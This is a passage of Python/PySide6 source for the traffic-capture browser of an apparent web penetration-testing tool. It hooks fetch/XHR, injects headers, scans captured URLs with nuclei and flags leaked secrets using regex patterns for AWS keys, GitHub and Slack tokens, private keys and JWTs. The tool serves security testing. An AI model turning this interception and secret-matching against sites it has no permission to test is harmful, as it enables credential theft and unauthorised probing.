                        var rh = {}; try { resp.headers.forEach(function(v,k){rh[k]=v;}); } catch(e){}
                        send({kind:'fetch', method:method, url:url, reqHeaders:reqHeaders, reqBody:reqBody,
                              status:resp.status, respHeaders:rh, respBody:body, ms:Date.now()-t0});
                      }).catch(function(){});
                    } catch(e){}
                    return resp;
                  });
                };
              }
              var OX = window.XMLHttpRequest;
              if (OX){
                window.XMLHttpRequest = function(){
                  var xhr = new OX();
                  var _m='GET', _u='', _b='', _rh={};
                  var op = xhr.open;
                  xhr.open = function(m,u){ _m=m; _u=u; return op.apply(xhr, arguments); };
                  var sh = xhr.setRequestHeader;
                  xhr.setRequestHeader = function(k,v){ _rh[k]=v; return sh.apply(xhr, arguments); };
                  var sn = xhr.send;
                  xhr.send = function(b){
                    _b = b ? String(b) : '';
                    xhr.addEventListener('loadend', function(){
                      var rh = {};
                      try { (xhr.getAllResponseHeaders()||'').trim().split(/\r?\n/).forEach(function(l){ var i=l.indexOf(':'); if(i>0) rh[l.slice(0,i).trim()]=l.slice(i+1).trim(); }); } catch(e){}
                      var body=''; try { body = (xhr.responseType===''||xhr.responseType==='text') ? xhr.responseText : ('['+xhr.responseType+']'); } catch(e){}
                      send({kind:'xhr', method:_m, url:_u, reqHeaders:_rh, reqBody:_b, status:xhr.status, respHeaders:rh, respBody:body});
                    });
                    return sn.apply(xhr, arguments);
                  };
                  return xhr;
                };
              }
            })();
            """

            class _Interceptor(QWebEngineUrlRequestInterceptor):
                captured = Signal(object)

                def __init__(self, parent=None):
                    super().__init__(parent)
                    self.extra_headers = {}   # injected into every request
                    self.block_types = set()  # resource-type ids to block
                    self.scope = ''           # only capture hosts containing this (blank=all)

                def interceptRequest(self, info):
                    try:
                        # Inject user-configured headers into every request.
                        for hk, hv in self.extra_headers.items():
                            try:
                                info.setHttpHeader(hk.encode('latin-1', 'ignore'),
                                                   str(hv).encode('latin-1', 'ignore'))
                            except Exception:
                                pass
                        rt = int(info.resourceType())
                        if rt in self.block_types:
                            info.block(True)
                            return
                        if _XHR_INT is not None and rt == _XHR_INT:
                            return  # fetch/XHR captured in full via the JS hook
                        url = info.requestUrl().toString()
                        if self.scope and self.scope.lower() not in (info.requestUrl().host() or '').lower():
                            return
                        self.captured.emit({
                            'method': bytes(info.requestMethod()).decode('ascii', 'replace'),
                            'url': url,
                            'type': _RT.get(rt, 'Other'),
                        })
                    except Exception:
                        pass

            class _CapturePage(QWebEnginePage):
                consoleMsg = Signal(str)

                def javaScriptConsoleMessage(self, level, message, lineNumber, sourceID):
                    try:
                        if isinstance(message, str) and message.startswith('__WPCAP__'):
                            self.consoleMsg.emit(message[9:])
                            return
                    except Exception:
                        pass

            # ---- page widgets ----
            page = QWidget()
            page.setObjectName('BrowserPage')
            v = QVBoxLayout(page)
            v.setContentsMargins(22, 20, 22, 20)
            hdr = QLabel('◍  Browser  —  live traffic capture')
            hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
            v.addWidget(hdr)

            # Navigation bar
            navrow = QHBoxLayout()
            back_btn = QPushButton('◀'); fwd_btn = QPushButton('▶'); reload_btn = QPushButton('↻')
            for b in (back_btn, fwd_btn, reload_btn):
                # padding:0 overrides the global 16px button padding — otherwise the
                # 34px-wide button has no room left and the glyph is clipped away.
                b.setFixedSize(40, 32)
                b.setStyleSheet('QPushButton { padding: 0px; font-size: 15px; font-weight: bold; }')
            url_edit = QLineEdit(); url_edit.setPlaceholderText('https://example.com')
            go_btn = QPushButton('Go')
            settings_btn = QPushButton('⚙ Settings')
            settings_btn.setToolTip('User-Agent, header injection, upstream proxy, scope, blocking, JS…')
            export_btn = QPushButton('⭳ HAR')
            export_btn.setToolTip('Export captured traffic as a HAR file')
            navrow.addWidget(back_btn); navrow.addWidget(fwd_btn); navrow.addWidget(reload_btn)
            navrow.addWidget(url_edit, 1); navrow.addWidget(go_btn)
            navrow.addWidget(settings_btn); navrow.addWidget(export_btn)
            v.addLayout(navrow)

            # Browser view + profile/page wired for capture. Creating the Chromium
            # view can fail at runtime (no GPU/GL context); degrade gracefully.
            script = None
            try:
                profile = QWebEngineProfile(page)               # off-the-record
                interceptor = _Interceptor(page)
                profile.setUrlRequestInterceptor(interceptor)
                wpage = _CapturePage(profile, page)
                try:
                    script = QWebEngineScript()
                    script.setName('wpcap')
                    script.setSourceCode(HOOK_JS)
                    script.setInjectionPoint(QWebEngineScript.InjectionPoint.DocumentCreation)
                    script.setWorldId(QWebEngineScript.ScriptWorldId.MainWorld)
                    script.setRunsOnSubFrames(True)
                    wpage.scripts().insert(script)
                except Exception:
                    pass
                view = QWebEngineView(page)
                view.setPage(wpage)
                view.setUrl(QUrl('about:blank'))
            except Exception as e:
                fb = QWidget()
                fbv = QVBoxLayout(fb)
                fbv.setContentsMargins(22, 20, 22, 20)
                fh = QLabel('◍  Browser')
                fh.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
                fm = QLabel('The embedded browser could not start (no GPU/OpenGL '
                            f'context).\n\n{type(e).__name__}: {e}')
                fm.setStyleSheet('color:#8b949e;')
                fbv.addWidget(fh); fbv.addWidget(fm); fbv.addStretch()
                return fb

            # Filter / search bar
            filt = QHBoxLayout()
            search_edit = QLineEdit(); search_edit.setPlaceholderText('search url / method / status…')
            method_combo = QComboBox()
            method_combo.addItems(['All', 'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'])
            type_combo = QComboBox()
            type_combo.addItems(['All', 'fetch', 'xhr', 'MainFrame', 'SubFrame', 'Script',
                                 'Stylesheet', 'Image', 'Font', 'Media', 'Other'])
            pause_btn = QPushButton('⏸ Pause'); pause_btn.setCheckable(True)
            clear_btn = QPushButton('🗑 Clear')
            rep_btn = QPushButton('Send to Repeater')
            expand_btn = QPushButton('⤢ Expand')
            count_lbl = QLabel('0')
            filt.addWidget(QLabel('Filter:')); filt.addWidget(search_edit, 1)
            filt.addWidget(method_combo); filt.addWidget(type_combo)
            filt.addWidget(pause_btn); filt.addWidget(clear_btn)
            filt.addWidget(rep_btn); filt.addWidget(expand_btn)
            filt.addWidget(QLabel('captured:')); filt.addWidget(count_lbl)

            # Traffic table
            cols = ['#', 'Time', 'Method', 'Status', 'Host', 'Path', 'Type', 'Length']
            table = QTableWidget(0, len(cols))
            table.setHorizontalHeaderLabels(cols)
            table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
            table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
            table.setSortingEnabled(True)
            try:
                table.horizontalHeader().setSectionResizeMode(5, QHeaderView.ResizeMode.Stretch)
            except Exception:
                pass

            detail = QPlainTextEdit(); detail.setReadOnly(True)
            detail.setStyleSheet('font-family:Consolas,monospace; font-size:12px;')

            # Traffic tab (capture table + detail)
            traffic_w = QWidget()
            tw = QVBoxLayout(traffic_w); tw.setContentsMargins(0, 0, 0, 0)
            tw.addLayout(filt)
            inner = QSplitter(Qt.Vertical)
            inner.addWidget(table); inner.addWidget(detail)
            inner.setSizes([320, 220])
            tw.addWidget(inner, 1)

            # Issues tab (passive scanner findings + detail)
            issues_w = QWidget()
            iw = QVBoxLayout(issues_w); iw.setContentsMargins(0, 0, 0, 0)

            # Issues toolbar: severity filter + search + counts + actions
            ibar = QHBoxLayout()
            isev_combo = QComboBox()
            isev_combo.addItems(['All', 'HIGH', 'MEDIUM', 'LOW', 'INFO'])
            isearch_edit = QLineEdit(); isearch_edit.setPlaceholderText('search type / host / detail…')
            icount_lbl = QLabel('no issues')
            iscan_btn = QPushButton('⚡ Scan all (nuclei)')
            iscan_btn.setToolTip('Run nuclei against every unique captured (in-scope) URL')
            iclear_btn = QPushButton('🗑 Clear')
            iexport_btn = QPushButton('⭳ Export')
            ibar.addWidget(QLabel('Severity:')); ibar.addWidget(isev_combo)
            ibar.addWidget(isearch_edit, 1)
            ibar.addWidget(icount_lbl)
            ibar.addWidget(iscan_btn); ibar.addWidget(iclear_btn); ibar.addWidget(iexport_btn)
            iw.addLayout(ibar)

            issues_table = QTableWidget(0, 4)
            issues_table.setHorizontalHeaderLabels(['Severity', 'Type', 'Host', 'Detail'])
            issues_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
            issues_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
            issues_table.setSortingEnabled(True)
            try:
                issues_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
                issues_table.setColumnWidth(0, 90)
            except Exception:
                pass
            issue_detail = QPlainTextEdit(); issue_detail.setReadOnly(True)
            issue_detail.setStyleSheet('font-family:Consolas,monospace; font-size:12px;')
            isplit = QSplitter(Qt.Vertical)
            isplit.addWidget(issues_table); isplit.addWidget(issue_detail)
            isplit.setSizes([320, 220])
            iw.addWidget(isplit, 1)

            tabs = QTabWidget()
            tabs.addTab(traffic_w, 'Traffic')
            tabs.addTab(issues_w, 'Issues (0)')

            outer = QSplitter(Qt.Vertical)
            outer.addWidget(view); outer.addWidget(tabs)
            outer.setSizes([300, 420])   # "a little window" on top, capture below
            v.addWidget(outer, 1)

            # ---- helpers ----
            def _now():
                return datetime.now().strftime('%H:%M:%S')

            def _next_id():
                state['seq'] += 1
                return state['seq']

            def _passes(t):
                q = search_edit.text().strip().lower()
                if q:
                    hay = f"{t.get('url','')} {t.get('method','')} {t.get('status','')}".lower()
                    if q not in hay:
                        return False
                m = method_combo.currentText()
                if m != 'All' and (t.get('method', '') or '').upper() != m:
                    return False
                ty = type_combo.currentText()
                if ty != 'All' and (t.get('type', '') or '').lower() != ty.lower():
                    return False
                return True

            def _num_item(n):
                it = QTableWidgetItem()
                it.setData(Qt.ItemDataRole.DisplayRole, int(n) if n not in (None, '') else 0)
                return it

            def _add_row(t):
                table.setSortingEnabled(False)
                r = table.rowCount()
                table.insertRow(r)
                id_item = _num_item(t['id'])
                id_item.setData(Qt.ItemDataRole.UserRole, t['id'])
                table.setItem(r, 0, id_item)
                table.setItem(r, 1, QTableWidgetItem(t.get('time', '')))
                table.setItem(r, 2, QTableWidgetItem(t.get('method', '')))
                st = t.get('status')
                table.setItem(r, 3, _num_item(st) if st is not None else QTableWidgetItem('—'))
                table.setItem(r, 4, QTableWidgetItem(t.get('host', '')))
                table.setItem(r, 5, QTableWidgetItem(t.get('path', '')))
                table.setItem(r, 6, QTableWidgetItem(t.get('type', '')))
                ln = t.get('length')
                table.setItem(r, 7, _num_item(ln) if ln is not None else QTableWidgetItem('—'))
                table.setSortingEnabled(True)

            def _refresh():
                table.setRowCount(0)
                for t in self._browser_txns:
                    if _passes(t):
                        _add_row(t)

            def _record(t):
                self._browser_txns.append(t)
                count_lbl.setText(str(len(self._browser_txns)))
                if not state['paused'] and _passes(t):
                    _add_row(t)
                try:
                    _passive(t)
                except Exception:
                    pass

            def _on_meta(rec):
                if state['paused']:
                    return
                u = urlparse(rec.get('url', ''))
                _record({
                    'id': _next_id(), 'time': _now(), 'method': rec.get('method', 'GET'),
                    'status': None, 'url': rec.get('url', ''), 'host': u.netloc,
                    'path': (u.path or '/') + (('?' + u.query) if u.query else ''),
                    'type': rec.get('type', 'Other'), 'length': None,
                    'reqHeaders': {}, 'reqBody': '', 'respHeaders': {}, 'respBody': '',
                    'source': 'request',
                })

            def _on_console(payload):
                if state['paused']:
                    return
                try:
                    rec = _json.loads(payload)
                except Exception:
                    return
                u = urlparse(rec.get('url', ''))
                if interceptor.scope and interceptor.scope.lower() not in (u.netloc or '').lower():
                    return  # respect the scope filter for JS-captured traffic too
                body = rec.get('respBody') or ''
                _record({
                    'id': _next_id(), 'time': _now(), 'method': (rec.get('method') or 'GET').upper(),
                    'status': rec.get('status'), 'url': rec.get('url', ''), 'host': u.netloc,
                    'path': (u.path or '/') + (('?' + u.query) if u.query else ''),
                    'type': rec.get('kind', 'fetch'), 'length': len(body),
                    'reqHeaders': rec.get('reqHeaders') or {}, 'reqBody': rec.get('reqBody') or '',
                    'respHeaders': rec.get('respHeaders') or {}, 'respBody': body,
                    'source': 'js',
                })

            def _selected_txn():
                items = table.selectedItems()
                if not items:
                    return None
                id_item = table.item(items[0].row(), 0)
                tid = id_item.data(Qt.ItemDataRole.UserRole) if id_item else None
                for t in self._browser_txns:
                    if t['id'] == tid:
                        return t
                return None

            def _format_txn(t):
                out = [f"{t.get('method')} {t.get('url')}",
                       f"Status: {t.get('status') if t.get('status') is not None else '—'}"
                       f"   Type: {t.get('type')}"
                       f"   Length: {t.get('length') if t.get('length') is not None else '—'}", '']
                rh = t.get('reqHeaders') or {}
                if rh:
                    out.append('— REQUEST HEADERS —')
                    out += [f"{k}: {val}" for k, val in rh.items()]
                    out.append('')
                if t.get('reqBody'):
                    out += ['— REQUEST BODY —', str(t['reqBody']), '']
                sh = t.get('respHeaders') or {}
                if sh:
                    out.append('— RESPONSE HEADERS —')
                    out += [f"{k}: {val}" for k, val in sh.items()]
                    out.append('')
                if t.get('respBody'):
                    out += ['— RESPONSE BODY —', str(t['respBody'])]
                if t.get('source') == 'request':
                    out += ['', '(request-level capture: response body/headers are not available '
                            'for this resource type — fetch/XHR API calls are captured in full)']
                return '\n'.join(out)

            def _show_detail():
                t = _selected_txn()
                if t:
                    detail.setPlainText(_format_txn(t))

            def _expand():
                t = _selected_txn()
                if not t:
                    return
                d = QtWidgets.QDialog(self)
                d.setWindowTitle(f"{t.get('method')} {t.get('host')}")
                d.resize(960, 720)
                dv = QVBoxLayout(d)
                te = QPlainTextEdit(); te.setReadOnly(True)
                te.setStyleSheet('font-family:Consolas,monospace; font-size:12px;')
                te.setPlainText(_format_txn(t))
                dv.addWidget(te)
                d.exec()

            def _to_repeater():
                t = _selected_txn()
                if not t:
                    return
                self._repeater_load({'method': t.get('method'), 'url': t.get('url'),
                                     'headers': t.get('reqHeaders') or {}, 'data': t.get('reqBody')})

            def _clear():
                self._browser_txns = []
                self._browser_issues = []
                state['seq'] = 0
                table.setRowCount(0)
                issues_table.setRowCount(0)
                detail.clear()
                issue_detail.clear()
                count_lbl.setText('0')
                _update_issue_counts()

            def _go():
                u = url_edit.text().strip()
                if not u:
                    return
                if '://' not in u and not u.startswith('about:'):
                    u = 'https://' + u
                    url_edit.setText(u)
                view.setUrl(QUrl(u))

            # ---- pentest: passive scanner + issues ----
            _SEV_COLOR = {'HIGH': '#ef4444', 'MEDIUM': '#f59e0b', 'LOW': '#9aa5b5', 'INFO': '#6b7585'}
            _SECRETS = [
                ('AWS Access Key', _re.compile(r'AKIA[0-9A-Z]{16}'), 'HIGH'),
                ('Google API Key', _re.compile(r'AIza[0-9A-Za-z\-_]{35}'), 'HIGH'),
                ('Slack Token', _re.compile(r'xox[baprs]-[0-9A-Za-z-]{10,}'), 'HIGH'),
                ('GitHub Token', _re.compile(r'gh[pousr]_[0-9A-Za-z]{36,}'), 'HIGH'),
                ('Private Key', _re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----'), 'HIGH'),
                ('JWT', _re.compile(r'eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{6,}'), 'MEDIUM'),
                ('Generic Secret', _re.compile(
                    r'''(?i)(?:api[_-]?key|secret|access[_-]?token|client[_-]?secret|password)["']?\s*[:=]\s*["'][^"']{8,}["']'''), 'MEDIUM'),
            ]
            _ERRORS = [
                ('SQL Error', _re.compile(r'(?i)SQL syntax|mysql_fetch|valid MySQL result|ORA-\d{5}|Unclosed quotation|SQLSTATE|PostgreSQL.{0,40}ERROR')),
                ('Stack Trace', _re.compile(r'Traceback \(most recent call last\)|Exception in thread|at [\w\.$]+\(\w+\.(?:java|kt):\d+\)|\.py", line \d+')),
            ]
            _SEC_HEADERS = [
                ('content-security-policy', 'Content-Security-Policy'),
                ('x-content-type-options', 'X-Content-Type-Options'),
                ('x-frame-options', 'X-Frame-Options'),
                ('referrer-policy', 'Referrer-Policy'),
                ('strict-transport-security', 'Strict-Transport-Security (HSTS)'),
            ]

            _SEV_RANK = {'HIGH': 0, 'MEDIUM': 1, 'LOW': 2, 'INFO': 3}
            _SEV_BG = {'HIGH': QColor(239, 68, 68, 40), 'MEDIUM': QColor(245, 158, 11, 30),
                       'LOW': QColor(99, 102, 241, 20), 'INFO': QColor(120, 130, 145, 12)}

            def _issue_passes(it):
                sv = isev_combo.currentText()
                if sv != 'All' and it.get('sev') != sv:
                    return False
                q = isearch_edit.text().strip().lower()
                if q and q not in f"{it.get('type','')} {it.get('host','')} {it.get('detail','')}".lower():
                    return False
                return True

            def _issue_row(it, idx):
                issues_table.setSortingEnabled(False)
                r = issues_table.rowCount(); issues_table.insertRow(r)
                sev = it.get('sev', 'INFO')
                sv = QTableWidgetItem(sev)
                sv.setForeground(QBrush(QColor(_SEV_COLOR.get(sev, '#9aa5b5'))))
                sv.setData(Qt.ItemDataRole.UserRole, idx)   # index into self._browser_issues
                issues_table.setItem(r, 0, sv)
                issues_table.setItem(r, 1, QTableWidgetItem(it.get('type', '')))
                issues_table.setItem(r, 2, QTableWidgetItem(it.get('host', '') or ''))
                issues_table.setItem(r, 3, QTableWidgetItem(it.get('detail', '')))
                bg = _SEV_BG.get(sev)
                if bg is not None:
                    for c in range(4):
                        issues_table.item(r, c).setBackground(QBrush(bg))
                issues_table.setSortingEnabled(True)

            def _update_issue_counts():
                counts = {}
                for it in self._browser_issues:
                    counts[it['sev']] = counts.get(it['sev'], 0) + 1
                parts = [f'{em} {counts[s]}' for s, em in
                         (('HIGH', '🔴'), ('MEDIUM', '🟠'), ('LOW', '🔵'), ('INFO', '⚪'))
                         if counts.get(s)]
                icount_lbl.setText('   '.join(parts) or 'no issues')
                tabs.setTabText(1, f'Issues ({len(self._browser_issues)})')

            def _issues_refresh():
                issues_table.setRowCount(0)
                order = sorted(range(len(self._browser_issues)),
                               key=lambda i: (_SEV_RANK.get(self._browser_issues[i]['sev'], 9), i))
                for idx in order:
                    if _issue_passes(self._browser_issues[idx]):
                        _issue_row(self._browser_issues[idx], idx)
                _update_issue_counts()

            def _add_issue(sev, typ, host, detail, txn_id):
                it = {'sev': sev, 'type': typ, 'host': host, 'detail': detail, 'txn': txn_id}
                self._browser_issues.append(it)
                if _issue_passes(it):
                    _issue_row(it, len(self._browser_issues) - 1)
                _update_issue_counts()

            def _passive(t):
                if t.get('source') != 'js':
                    return  # only JS-captured txns carry full response bodies/headers
                body = t.get('respBody') or ''
                rh = {str(k).lower(): str(vv) for k, vv in (t.get('respHeaders') or {}).items()}
                host = t.get('host', ''); url = t.get('url', '')
                seen = set()

                def _emit(sev, typ, detail):
                    if (typ, detail) in seen:
                        return
                    seen.add((typ, detail))
                    _add_issue(sev, typ, host, detail, t['id'])

                for name, rx, sev in _SECRETS:
                    if body and rx.search(body):
                        _emit(sev, f'Secret: {name}', f'{name} in response body of {url}')
                for name, rx in _ERRORS:
                    if body and rx.search(body):
                        _emit('MEDIUM', name, f'{name} leaked in response of {url}')
                ctype = rh.get('content-type', '')
                if 'html' in ctype or 'json' in ctype:
                    for hk, label in _SEC_HEADERS:
                        if hk == 'strict-transport-security' and not url.lower().startswith('https'):
                            continue
                        if hk not in rh:
                            _emit('LOW', 'Missing Security Header', f'Missing {label} on {url}')
                if rh.get('set-cookie'):
                    low = rh['set-cookie'].lower()
                    miss = [f for f in ('secure', 'httponly', 'samesite') if f not in low]
                    if miss:
                        _emit('LOW', 'Insecure Cookie', f'Set-Cookie missing {", ".join(miss)} on {url}')
                try:
                    for p, vals in parse_qs(urlparse(url).query).items():
                        for val in vals:
                            if len(val) >= 4 and body and val in body:
                                _emit('MEDIUM', 'Reflected Parameter',
                                      f"Param '{p}' reflected in response (possible XSS) at {url}")
                                break
                except Exception:
                    pass

            def _selected_issue():
                items = issues_table.selectedItems()
                if not items:
                    return None
                ci = issues_table.item(items[0].row(), 0)
                idx = ci.data(Qt.ItemDataRole.UserRole) if ci else None
                if idx is None or idx >= len(self._browser_issues):
                    return None
                return self._browser_issues[idx]

            def _issue_txn(it):
                for t in self._browser_txns:
                    if t['id'] == (it or {}).get('txn'):
                        return t
                return None

            def _issue_selected():
                it = _selected_issue()
                if not it:
                    return
                t = _issue_txn(it)
                head = f"[{it['sev']}]  {it['type']}\n{it['detail']}\n\n"
                issue_detail.setPlainText(head + (_format_txn(t) if t else '(no captured request linked)'))

            def _issue_ctx(pos):
                it = _selected_issue()
                if not it:
                    return
                t = _issue_txn(it)
                m = QMenu(issues_table)
                a_open = m.addAction('Open URL in browser')
                a_rep = m.addAction('Send request to Repeater')
                a_copy = m.addAction('Copy detail')
                a_nuc = m.addAction('Scan host with nuclei')
                chosen = m.exec(issues_table.viewport().mapToGlobal(pos))
                if chosen == a_open and t and t.get('url'):
                    view.setUrl(QUrl(t['url']))
                elif chosen == a_rep and t:
                    self._repeater_load({'method': t.get('method'), 'url': t.get('url'),
                                         'headers': t.get('reqHeaders') or {}, 'data': t.get('reqBody')})
                elif chosen == a_copy:
                    try:
                        QtWidgets.QApplication.clipboard().setText(
                            f"[{it['sev']}] {it['type']} — {it['detail']}")
                    except Exception:
                        pass
                elif chosen == a_nuc and t:
                    _nuclei_scan(t)

            def _clear_issues():
                self._browser_issues = []
                issues_table.setRowCount(0)
                issue_detail.clear()
                _update_issue_counts()

            def _export_issues():
                from PySide6.QtWidgets import QFileDialog
                path, _ = QFileDialog.getSaveFileName(self, 'Export issues',
                                                      'browser_issues.json', 'JSON (*.json);;CSV (*.csv)')
                if not path:
                    return
                try:
                    if path.lower().endswith('.csv'):
                        import csv
                        with open(path, 'w', newline='', encoding='utf-8') as f:
                            w = csv.writer(f); w.writerow(['severity', 'type', 'host', 'detail'])
                            for it in self._browser_issues:
                                w.writerow([it['sev'], it['type'], it['host'], it['detail']])
                    else:
                        with open(path, 'w', encoding='utf-8') as f:
                            _json.dump(self._browser_issues, f, indent=2, default=str)
                except Exception as e:
                    QMessageBox.warning(self, 'Export', f'Failed: {e}')

            def _scan_all_nuclei():
                import shutil
                from PySide6.QtCore import QProcess
                if not shutil.which('nuclei'):
                    self._download_tools_dialog(['nuclei'],
                        'nuclei is needed to actively scan the captured URLs.', title='Install nuclei')
                    if not shutil.which('nuclei'):
                        return
                seen = set(); urls = []
                for t in self._browser_txns:
                    u = t.get('url')
                    if not u or u in seen:
                        continue
                    if interceptor.scope and interceptor.scope.lower() not in (t.get('host', '') or '').lower():
                        continue
                    seen.add(u); urls.append(u)
                urls = urls[:300]
                if not urls:
                    _add_issue('INFO', 'nuclei', '', 'No captured URLs to scan yet.', None)
                    return
                _add_issue('INFO', 'nuclei', '', f'Scanning {len(urls)} captured URL(s) with nuclei…', None)
                buf = {'data': ''}
                proc = QProcess(page)
                proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)

                def _out():
                    buf['data'] += bytes(proc.readAllStandardOutput()).decode('utf-8', 'replace')

                def _fin(*_a):
                    n = 0
                    for line in buf['data'].splitlines():
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            obj = _json.loads(line)
                        except Exception:
                            continue
                        info = obj.get('info') or {}
                        sev = {'critical': 'HIGH', 'high': 'HIGH', 'medium': 'MEDIUM',
                               'low': 'LOW', 'info': 'INFO'}.get(
                                   str(info.get('severity', 'info')).lower(), 'INFO')
                        matched = obj.get('matched-at') or obj.get('host') or ''
                        host = ''
                        try:
                            host = urlparse(matched).netloc
                        except Exception:
                            pass
                        _add_issue(sev, f"nuclei: {info.get('name', 'finding')}", host, matched, None)
                        n += 1
                    _add_issue('INFO', 'nuclei', '', f'nuclei batch finished — {n} finding(s)', None)

                proc.readyReadStandardOutput.connect(_out)
                proc.finished.connect(_fin)
                self._browser_procs = getattr(self, '_browser_procs', [])
                self._browser_procs.append(proc)
                proc.start('nuclei', ['-silent', '-jsonl'])
                try:
                    proc.write(('\n'.join(urls) + '\n').encode('utf-8'))
                    proc.closeWriteChannel()
                except Exception:
                    pass

            # ---- pentest: per-request actions ----
            def _sh(s):
                return "'" + str(s).replace("'", "'\\''") + "'"

            def _copy_curl(t):
                parts = [f"curl -X {t.get('method', 'GET')} {_sh(t.get('url', ''))}"]
                for k, val in (t.get('reqHeaders') or {}).items():
                    parts.append(f"-H {_sh(f'{k}: {val}')}")
                if t.get('reqBody'):
                    parts.append(f"--data {_sh(str(t['reqBody']))}")
                try:
                    QtWidgets.QApplication.clipboard().setText(' '.join(parts))
                except Exception:
                    pass

            def _nuclei_scan(t):
                import shutil
                from PySide6.QtCore import QProcess
                url = t.get('url')
                if not url:
                    return
                if not shutil.which('nuclei'):
                    self._download_tools_dialog(['nuclei'],
                        'nuclei is needed to scan this URL for vulnerabilities.',
                        title='Install nuclei')
                    if not shutil.which('nuclei'):
                        return
                tabs.setCurrentIndex(1)
                _add_issue('INFO', 'nuclei', t.get('host', ''), f'Scanning {url} with nuclei…', t['id'])
                buf = {'data': ''}
                proc = QProcess(page)
                proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)

                def _out():
                    buf['data'] += bytes(proc.readAllStandardOutput()).decode('utf-8', 'replace')

                def _fin(*_a):
                    n = 0
                    for line in buf['data'].splitlines():
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            obj = _json.loads(line)
                        except Exception:
                            continue
                        info = obj.get('info') or {}
                        sev = {'critical': 'HIGH', 'high': 'HIGH', 'medium': 'MEDIUM',
                               'low': 'LOW', 'info': 'INFO'}.get(
                                   str(info.get('severity', 'info')).lower(), 'INFO')
                        _add_issue(sev, f"nuclei: {info.get('name', 'finding')}",
                                   t.get('host', ''), obj.get('matched-at') or url, t['id'])
                        n += 1
                    _add_issue('INFO', 'nuclei', t.get('host', ''),
                               f'nuclei finished — {n} finding(s) for {url}', t['id'])

                proc.readyReadStandardOutput.connect(_out)
                proc.finished.connect(_fin)
                self._browser_procs = getattr(self, '_browser_procs', [])
                self._browser_procs.append(proc)
                proc.start('nuclei', ['-u', url, '-silent', '-jsonl'])

            def _ctx_menu(pos):
                t = _selected_txn()
                if not t:
                    return
                m = QMenu(table)
                a_rep = m.addAction('Send to Repeater')
                a_curl = m.addAction('Copy as cURL')
                a_open = m.addAction('Open URL in browser')
                a_nuc = m.addAction('Scan URL with nuclei')
                chosen = m.exec(table.viewport().mapToGlobal(pos))
                if chosen == a_rep:
                    _to_repeater()
                elif chosen == a_curl:
                    _copy_curl(t)
                elif chosen == a_open and t.get('url'):
                    view.setUrl(QUrl(t['url']))
                elif chosen == a_nuc:
                    _nuclei_scan(t)

            # ---- customization: settings + export ----
            def _apply_proxy(s):
                from PySide6.QtNetwork import QNetworkProxy
                try:
                    if not s:
                        QNetworkProxy.setApplicationProxy(QNetworkProxy(QNetworkProxy.ProxyType.NoProxy))
                        return
                    host, _, port = s.partition(':')
                    QNetworkProxy.setApplicationProxy(QNetworkProxy(
                        QNetworkProxy.ProxyType.HttpProxy, host.strip(), int(port or '8080')))
                except Exception:
                    pass

            def _settings():
                from PySide6.QtWidgets import (QDialog, QFormLayout, QDialogButtonBox, QCheckBox)
                d = QDialog(self); d.setWindowTitle('Browser settings'); d.resize(580, 540)
                form = QFormLayout(d)
                ua_edit = QLineEdit(); ua_edit.setText(profile.httpUserAgent())
                form.addRow('User-Agent:', ua_edit)
                hdr_edit = QPlainTextEdit(); hdr_edit.setMaximumHeight(110)
                hdr_edit.setPlaceholderText('one per line — e.g.  X-Forwarded-For: 127.0.0.1')
                hdr_edit.setPlainText('\n'.join(f'{k}: {v}' for k, v in interceptor.extra_headers.items()))
                form.addRow('Inject headers:', hdr_edit)
                proxy_edit = QLineEdit(); proxy_edit.setText(getattr(self, '_browser_proxy', ''))
                proxy_edit.setPlaceholderText('host:port (e.g. 127.0.0.1:8080 to chain through Burp/Caido)')
                form.addRow('Upstream proxy:', proxy_edit)
                scope_edit = QLineEdit(); scope_edit.setText(interceptor.scope)
                scope_edit.setPlaceholderText('only capture hosts containing this (blank = all)')
                form.addRow('Scope host:', scope_edit)
                block_chk = QCheckBox('Block images / media / fonts (faster, fewer rows)')
                block_chk.setChecked(bool(interceptor.block_types))
                form.addRow('', block_chk)
                js_chk = QCheckBox('Disable JavaScript (also disables fetch/XHR capture)')
                try:
                    js_chk.setChecked(not wpage.settings().testAttribute(
                        QWebEngineSettings.WebAttribute.JavascriptEnabled))
                except Exception:
                    pass
                form.addRow('', js_chk)
                clear_now = QPushButton('Clear cookies + cache now')

                def _clear_cc():
                    try:
                        profile.cookieStore().deleteAllCookies()
                        profile.clearHttpCache()
                    except Exception:
                        pass
                clear_now.clicked.connect(_clear_cc)
                form.addRow('', clear_now)
                bb = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
                bb.accepted.connect(d.accept); bb.rejected.connect(d.reject)
                form.addRow(bb)
                if d.exec() != QDialog.DialogCode.Accepted:
                    return
                ua = ua_edit.text().strip()
                if ua:
                    try:
                        profile.setHttpUserAgent(ua)
                    except Exception:
                        pass
                hh = {}
                for line in hdr_edit.toPlainText().splitlines():
                    if ':' in line:
                        k, _, vv = line.partition(':')
                        if k.strip():
                            hh[k.strip()] = vv.strip()
                interceptor.extra_headers = hh
                interceptor.scope = scope_edit.text().strip()
                interceptor.block_types = ({i for n, i in _RT_BY_NAME.items()
                                            if n in ('image', 'media', 'fontresource')}
                                           if block_chk.isChecked() else set())
                self._browser_proxy = proxy_edit.text().strip()
                _apply_proxy(self._browser_proxy)
                try:
                    wpage.settings().setAttribute(
                        QWebEngineSettings.WebAttribute.JavascriptEnabled, not js_chk.isChecked())
                except Exception:
                    pass

            def _export():
                from PySide6.QtWidgets import QFileDialog
                path, _ = QFileDialog.getSaveFileName(self, 'Export traffic (HAR)',
                                                      'browser_traffic.har', 'HAR (*.har);;JSON (*.json)')
